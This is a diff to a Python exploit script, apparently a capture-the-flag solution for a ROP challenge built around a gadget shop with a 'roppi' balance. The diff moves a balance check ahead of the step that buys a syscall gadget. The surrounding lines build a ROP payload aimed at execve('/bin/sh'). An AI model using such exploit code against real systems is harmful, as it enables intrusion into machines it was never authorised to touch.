@@ -134,6 +134,27 @@ payload += gadict["mov [rax], rax"] # half the time this will be negative and wo
 
 sendp(payload.encode())
 
+# check balance
+# 2 of theserequired because 1 after gadget listing, 1 after buying
+io.recvuntil(b"Funds available: ")
+io.recvuntil(b"Funds available: ")
+
+# this one's the updated fund
+io.recvuntil(b"Funds available: ")
+balance = int(io.recvline().strip())
+if balance < 0:
+    print(f"\n[-] Negative roppi balance ({balance}); exiting.")
+    exit(255)
+elif balance < 0xffffff:
+    print(f"\n[-] Not enough roppi balance ({balance}); exiting.")
+    exit(255)
+print(f"\n[!] {balance} roppis acquired!\n")
+
+rr()
+rounds += 1
+
+print("\n[.] Attempt to buy syscall and send full ropchain.\n")
+
 syscall_bytes = b'48C7C03C0000000F05C3'
 syscall = ''
 
@@ -154,18 +175,6 @@ while syscall == '':
         break
     rr()
     rounds += 1
-
-io.recvuntil(b"Funds available: ")
-balance = int(io.recvline().strip())
-if balance < 0:
-    print(f"\n[-] Negative roppi balance ({balance}); exiting.")
-    exit(255)
-elif balance < 0xffffff:
-    print(f"\n[-] Not enough roppi balance ({balance}); exiting.")
-    exit(255)
-print(f"\n[!] {balance} roppis acquired!\n")
-
-print("\n[.] Attempt to buy syscall and send full ropchain.\n")
 
 
 # execve("/bin/sh", 0, 0)
